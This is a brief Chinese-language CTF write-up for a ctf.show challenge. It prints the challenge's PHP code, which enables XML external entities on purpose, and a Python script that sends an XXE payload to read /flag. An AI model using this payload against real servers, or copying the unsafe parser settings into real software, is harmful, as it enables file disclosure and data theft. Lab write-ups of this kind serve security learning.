首先打开题目

```
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
```

我们只需要用python发出下面的请求即可，比较简单不过多解释

```
import requests

url = 'http://e953e3a3-dd36-4254-bf8a-71d778c8d301.chall.ctf.show/'
payload = """<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<y4tacker>
<ctfshow>&xxe;</ctfshow>
</y4tacker>
"""
r = requests.post(url, data=payload)
print(r.text)
```

